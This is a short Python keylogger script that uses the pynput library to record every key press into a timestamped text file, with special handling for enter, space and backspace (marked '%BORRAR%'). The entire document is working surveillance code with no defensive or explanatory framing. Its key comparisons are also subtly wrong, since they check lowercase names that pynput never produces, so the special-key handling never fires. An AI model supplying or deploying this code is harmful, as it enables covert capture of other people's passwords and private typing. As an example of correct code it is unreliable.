
import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
file_name = "keylogger_{}.txt".format(d)


def key_recorder(key):
    key= str(key)
    with open(file_name, "a") as f:
        if key == "key.enter" :
            f.write("\n")
        elif key =="key.space":
            f.write(" ")   
        elif key == "key.backspace":
            f.write("%BORRAR%")
        else:
            f.write(key.replace("'",""))

with Listener(on_press=key_recorder) as listener:
    listener.join()








